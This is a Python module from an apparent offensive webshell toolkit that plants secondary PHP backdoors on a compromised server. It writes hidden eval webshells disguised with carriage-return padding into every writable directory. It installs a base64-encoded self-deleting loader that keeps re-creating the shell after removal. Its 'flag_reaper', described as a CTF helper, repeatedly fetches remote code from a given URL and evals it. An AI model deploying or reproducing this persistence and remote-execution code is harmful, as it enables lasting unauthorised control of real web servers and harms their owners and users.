"""Drop secondary webshells into writable directories.

Three flavours, all from v1:

* :func:`inject_webshell` — write a plain ``eval`` shell to every writable dir.
* :func:`inject_memory_webshell` — write a self-deleting loader that keeps
  re-creating the shell file in the background (survives file removal).
* :func:`flag_reaper` — a CTF helper that repeatedly pulls and evals remote
  code, leaking results to your web server's access log.
"""

from __future__ import annotations

import base64
from pathlib import Path

import requests

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell
from ..utils.http import base_url
from ..utils.strings import random_string

_LOG_FILE = "injected_webshells.txt"


def _url_for(ws: WebShell, server_dir: str, filename: str) -> str:
    root = ws.webroot.rstrip("/")
    directory = server_dir.rstrip("/")
    rel = directory[len(root):].lstrip("/") if directory.startswith(root) else ""
    path = "/".join(part for part in (rel, filename) if part)
    return f"{base_url(ws.url)}/{path}"


def _record(output_dir: Path, line: str) -> None:
    with open(output_dir / _LOG_FILE, "a", encoding="utf-8") as handle:
        handle.write(line + "\n")


def _write_remote(ws: WebShell, server_path: str, content: str) -> bool:
    code = (
        f"echo file_put_contents({php_string(server_path)}, {php_string(content)}) "
        "!== false ? 'OK' : 'FAIL'"
    )
    return "OK" in ws.run_php(code)


def inject_webshell(
    ws: WebShell, password: str, writable_dirs: list[str], *, output_dir: Path
) -> list[str]:
    """Drop ``<?php @eval($_REQUEST[password]) ?>`` into each writable dir."""
    shell = f"<?php @eval($_REQUEST['{password}']);?>"
    fake = "<?php print_r('It works');?>"
    content = shell + "\r" + fake + " " * max(0, len(shell) - len(fake)) + "\n"
    urls: list[str] = []
    for directory in writable_dirs:
        filename = f".{random_string(16)}.php"
        server_path = f"{directory.rstrip('/')}/{filename}"
        if _write_remote(ws, server_path, content):
            url = _url_for(ws, directory, filename)
            urls.append(url)
            _record(output_dir, f"{url} => {password}")
            log.success(f"Injected: {url} (password={password})")
        else:
            log.error(f"Write failed in {directory}")
    return urls


def inject_memory_webshell(
    ws: WebShell, password: str, writable_dirs: list[str], *, output_dir: Path
) -> None:
    """Drop a self-deleting loader that keeps re-creating the shell file."""
    shell = f"<?php @eval($_REQUEST['{password}']);?>"
    for directory in writable_dirs:
        target = f"{directory.rstrip('/')}/.index.php"
        loader = (
            "set_time_limit(0);ignore_user_abort(true);"
            f"$f={php_string(target)};$s={php_string(shell)};"
            "unlink(__FILE__);"
            "while(true){if(!file_exists($f)){file_put_contents($f,$s);}usleep(100000);}"
        )
        loader_php = f"<?php eval(base64_decode('{base64.b64encode(loader.encode()).decode()}'));"
        loader_name = f".{random_string(16)}.php"
        loader_path = f"{directory.rstrip('/')}/{loader_name}"
        if not _write_remote(ws, loader_path, loader_php):
            log.error(f"Write failed in {directory}")
            continue
        url = _url_for(ws, directory, loader_name)
        if _activate(ws, url):
            shell_url = _url_for(ws, directory, ".index.php")
            _record(output_dir, f"{shell_url} => {password} (memory)")
            log.success(f"Memory webshell active: {shell_url} (password={password})")


def flag_reaper(ws: WebShell, code_url: str, writable_dirs: list[str]) -> int:
    """Inject a loop that pulls + evals ``code_url`` every few seconds (CTF)."""
    loop = (
        "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);"
        f"while(true){{$c=file_get_contents({php_string(code_url)});eval($c);sleep(5);}}"
    )
    payload = f"<?php eval(base64_decode('{base64.b64encode(loop.encode()).decode()}'));"
    activated = 0
    for directory in writable_dirs:
        name = f".{random_string(16)}.php"
        path = f"{directory.rstrip('/')}/{name}"
        if _write_remote(ws, path, payload) and _activate(ws, _url_for(ws, directory, name)):
            activated += 1
    if activated:
        log.success(f"Flag reaper running in {activated} location(s); watch your access log.")
    else:
        log.error("Flag reaper failed to activate anywhere.")
    return activated


def _activate(ws: WebShell, url: str) -> bool:
    """Visit a payload URL; a read timeout means its infinite loop is running."""
    log.info(f"Activating {url} (1s timeout) ...")
    try:
        ws.transport.fetch(url, timeout=1)
    except requests.exceptions.ReadTimeout:
        return True
    except requests.RequestException as exc:
        log.error(f"Activation request failed: {exc}")
        return False
    # Returned promptly => the directory probably can't execute PHP.
    log.error("Payload returned immediately — directory may not execute PHP.")
    return False
